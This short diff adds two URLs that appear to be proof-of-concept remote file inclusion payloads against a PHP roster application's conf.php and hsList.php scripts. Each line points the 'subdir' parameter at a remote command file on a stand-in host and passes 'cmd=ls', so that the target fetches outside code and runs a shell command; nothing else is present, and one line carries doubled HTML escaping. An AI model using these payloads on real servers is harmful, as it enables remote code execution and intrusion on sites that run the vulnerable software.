@@ -1,0 +1,2 @@
+http://www.example.com/[wow_roster_path]/conf.php?subdir=http://www.example.com/cmd.txt?&amp;amp;cmd=ls
+http://www.example.com/[wow_roster_path]/hsList.php?subdir=http://www.example.com/cmd.txt?&amp;cmd=ls
